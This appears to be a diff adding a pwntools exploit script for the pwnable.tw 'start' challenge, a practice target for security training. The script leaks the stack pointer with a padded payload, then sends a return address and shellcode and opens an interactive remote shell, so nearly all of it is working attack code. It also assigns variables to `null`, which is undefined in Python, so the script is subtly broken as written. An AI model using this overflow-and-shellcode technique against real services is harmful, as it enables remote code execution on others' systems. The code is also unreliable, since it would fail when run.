@@ -1,0 +1,41 @@
+#!/bin/python
+from pwn import *
+from binascii import hexlify
+
+
+def main():
+    payload_get_esp = null
+    shellcode = null
+
+    with log.progress("Loading payloads...") as p:
+        payload_get_esp = open("get_esp.bin", "rb").read()
+        shellcode = open("shellcode.bin", "rb").read()
+        p.success()
+
+    #conn = remote('127.0.0.1', 2323)
+    conn = remote("chall.pwnable.tw", 10000)
+
+    context.terminal = ["gnome-terminal", "-e"]
+    #gdb.attach("start")
+
+    with log.progress("Receiving initial input") as p:
+        p.success("`%s`" % conn.recv(0x15).decode())
+
+    esp = null
+    with log.progress("Sending payload to get  ESP register") as p:
+        conn.send(prepare(payload_get_esp))
+        esp = int.from_bytes(conn.recv(0x100)[:4], byteorder="little")
+        p.success('Done ESP=%s' % hex(esp))
+
+    with log.progress("Sending shellcode") as p:
+        conn.send(prepare(int.to_bytes(
+            esp + 0x14, byteorder="little", length=4) + shellcode))
+        p.success("Obtained interactive shell")
+        conn.interactive()
+
+
+def prepare(payload):
+    return b'\0' * 0x14 + payload
+
+
+main()
